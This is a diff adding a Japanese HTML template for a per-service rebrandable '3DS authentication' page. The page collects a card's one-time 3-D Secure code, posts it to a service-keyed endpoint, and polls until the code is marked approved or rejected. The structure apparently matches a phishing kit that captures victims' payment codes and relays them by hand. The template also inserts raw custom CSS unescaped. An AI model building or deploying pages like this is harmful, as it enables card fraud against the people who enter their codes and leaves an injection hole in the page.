@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>3DS認証 - {{ service.display_name }}</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: {{ service.design.font_family }};
+            background-color: {{ service.design.background_color }};
+            color: {{ service.design.text_color }};
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background-color: {{ service.design.background_color }};
+            border: 2px solid {{ service.design.border_color }};
+            padding: 40px;
+            max-width: 500px;
+            width: 100%;
+        }
+
+        h1 {
+            font-size: 28px;
+            margin-bottom: 20px;
+            text-align: center;
+            font-weight: bold;
+            color: {{ service.design.text_color }};
+        }
+
+        .instruction {
+            text-align: center;
+            margin-bottom: 30px;
+            font-size: 16px;
+            color: {{ service.design.text_color }};
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: bold;
+            font-size: 14px;
+            color: {{ service.design.text_color }};
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid {{ service.design.border_color }};
+            font-size: 16px;
+            background-color: {{ service.design.secondary_color }};
+            color: {{ service.design.text_color }};
+        }
+
+        input[type="text"]:focus {
+            outline: none;
+            border-color: {{ service.design.primary_color }};
+        }
+
+        .btn {
+            width: 100%;
+            padding: 15px;
+            background-color: {{ service.design.button_bg_color }};
+            color: {{ service.design.button_text_color }};
+            border: none;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .btn:hover {
+            opacity: 0.9;
+        }
+
+        .error-message {
+            color: {{ service.design.text_color }};
+            text-align: center;
+            margin-top: 20px;
+            padding: 10px;
+            border: 2px solid {{ service.design.border_color }};
+            background-color: {{ service.design.secondary_color }};
+            display: none;
+        }
+
+        .error-message:not(:empty) {
+            display: block;
+        }
+
+        .waiting-message {
+            text-align: center;
+            padding: 40px 20px;
+            display: none;
+        }
+
+        .waiting-message p {
+            font-size: 18px;
+            margin-bottom: 30px;
+            color: {{ service.design.text_color }};
+        }
+
+        .spinner {
+            border: 4px solid {{ service.design.secondary_color }};
+            border-top: 4px solid {{ service.design.primary_color }};
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* カスタムCSS */
+        {{ service.design.custom_css | safe }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>3DS認証</h1>
+        <p class="instruction">3DSコードを入力してください</p>
+        
+        <form id="threeDSForm">
+            <div class="form-group">
+                <label for="code">3DSコード（4〜8桁の数字）</label>
+                <input type="text" id="code" name="code" maxlength="8" placeholder="123456" required>
+            </div>
+            
+            <button type="submit" class="btn">送信</button>
+        </form>
+        
+        <div id="error" class="error-message"></div>
+        <div id="waiting" class="waiting-message">
+            <p>認証中です...</p>
+            <div class="spinner"></div>
+        </div>
+    </div>
+
+    <script>
+        const paymentId = "{{ payment_id }}";
+        const serviceKey = "{{ service_key }}";
+        let checkInterval = null;
+
+        // 数字のみ入力可能
+        document.getElementById('code').addEventListener('input', function(e) {
+            e.target.value = e.target.value.replace(/\D/g, '');
+        });
+
+        // フォーム送信
+        document.getElementById('threeDSForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const errorDiv = document.getElementById('error');
+            const waitingDiv = document.getElementById('waiting');
+            errorDiv.textContent = '';
+            
+            const code = document.getElementById('code').value;
+            
+            // バリデーション
+            if (code.length < 4 || code.length > 8) {
+                errorDiv.textContent = '4〜8桁の数字を入力してください';
+                return;
+            }
+            
+            try {
+                const response = await fetch(`/${serviceKey}/submit_3ds`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        code: code
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    waitingDiv.style.display = 'block';
+                    document.getElementById('threeDSForm').style.display = 'none';
+                    
+                    // 2秒ごとに状態をチェック
+                    checkInterval = setInterval(async () => {
+                        try {
+                            const statusResponse = await fetch(`/${serviceKey}/check_status/${paymentId}`);
+                            const status = await statusResponse.json();
+                            
+                            if (status.status === '3ds_approved') {
+                                clearInterval(checkInterval);
+                                window.location.href = `/${serviceKey}/complete`;
+                            } else if (status.status === '3ds_rejected') {
+                                clearInterval(checkInterval);
+                                waitingDiv.style.display = 'none';
+                                document.getElementById('threeDSForm').style.display = 'block';
+                                errorDiv.textContent = '認証が却下されました。再度入力してください';
+                                document.getElementById('code').value = '';
+                            }
+                        } catch (error) {
+                            console.error('状態チェックエラー:', error);
+                        }
+                    }, 2000);
+                } else {
+                    errorDiv.textContent = result.message;
+                }
+            } catch (error) {
+                errorDiv.textContent = 'エラーが発生しました';
+            }
+        });
+    </script>
+</body>
+</html>
